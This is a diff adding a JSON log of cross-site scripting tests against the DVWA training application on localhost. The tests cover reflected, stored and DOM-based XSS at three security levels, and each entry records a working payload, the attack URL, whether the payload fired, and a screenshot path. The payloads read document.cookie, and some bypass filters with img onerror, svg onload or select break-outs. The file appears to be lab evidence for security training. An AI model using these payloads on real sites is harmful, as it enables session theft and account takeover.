@@ -1,0 +1,87 @@
+[
+  {
+    "type": "reflected",
+    "level": "low",
+    "payload": "<script>alert(document.cookie)</script>",
+    "url": "http://localhost:4280/vulnerabilities/xss_r/?name=<script>alert(document.cookie)<%2Fscript>",
+    "fired": true,
+    "alertMsg": "security=low",
+    "shot": "C:\\www\\DVWA\\xss-evidence\\output\\shot_reflected_low.png"
+  },
+  {
+    "type": "reflected",
+    "level": "medium",
+    "payload": "<img src=x onerror=alert(document.cookie)>",
+    "url": "http://localhost:4280/vulnerabilities/xss_r/?name=<img src%3Dx onerror%3Dalert(document.cookie)>",
+    "fired": true,
+    "alertMsg": "security=medium",
+    "shot": "C:\\www\\DVWA\\xss-evidence\\output\\shot_reflected_medium.png"
+  },
+  {
+    "type": "reflected",
+    "level": "high",
+    "payload": "<svg/onload=alert(document.cookie)>",
+    "url": "http://localhost:4280/vulnerabilities/xss_r/?name=<svg%2Fonload%3Dalert(document.cookie)>",
+    "fired": true,
+    "alertMsg": "security=high",
+    "shot": "C:\\www\\DVWA\\xss-evidence\\output\\shot_reflected_high.png"
+  },
+  {
+    "type": "stored",
+    "level": "low",
+    "field": "message",
+    "payload": "<script>alert(document.cookie)</script>",
+    "url": "http://localhost:4280/vulnerabilities/xss_s/",
+    "fired": true,
+    "alertMsg": "security=low",
+    "shot": "C:\\www\\DVWA\\xss-evidence\\output\\shot_stored_low.png"
+  },
+  {
+    "type": "stored",
+    "level": "medium",
+    "field": "name",
+    "payload": "<img src=x onerror=alert(document.cookie)>",
+    "url": "http://localhost:4280/vulnerabilities/xss_s/",
+    "fired": true,
+    "alertMsg": "security=medium",
+    "shot": "C:\\www\\DVWA\\xss-evidence\\output\\shot_stored_medium.png"
+  },
+  {
+    "type": "stored",
+    "level": "high",
+    "field": "name",
+    "payload": "<svg/onload=alert(document.cookie)>",
+    "url": "http://localhost:4280/vulnerabilities/xss_s/",
+    "fired": true,
+    "alertMsg": "security=high",
+    "shot": "C:\\www\\DVWA\\xss-evidence\\output\\shot_stored_high.png"
+  },
+  {
+    "type": "dom",
+    "level": "low",
+    "payload": "<script>alert(document.cookie)</script>",
+    "url": "http://localhost:4280/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>",
+    "fired": true,
+    "alertMsg": "security=low",
+    "shot": "C:\\www\\DVWA\\xss-evidence\\output\\shot_dom_low.png"
+  },
+  {
+    "type": "dom",
+    "level": "medium",
+    "payload": "</option></select><img src=x onerror=alert(document.cookie)>",
+    "url": "http://localhost:4280/vulnerabilities/xss_d/?default=</option></select><img src=x onerror=alert(document.cookie)>",
+    "fired": true,
+    "alertMsg": "security=medium",
+    "shot": "C:\\www\\DVWA\\xss-evidence\\output\\shot_dom_medium.png"
+  },
+  {
+    "type": "dom",
+    "level": "high",
+    "payload": "English#<script>alert(document.cookie)</script>",
+    "fragment": true,
+    "url": "http://localhost:4280/vulnerabilities/xss_d/?default=English#<script>alert(document.cookie)</script>",
+    "fired": true,
+    "alertMsg": "security=high",
+    "shot": "C:\\www\\DVWA\\xss-evidence\\output\\shot_dom_high.png"
+  }
+]
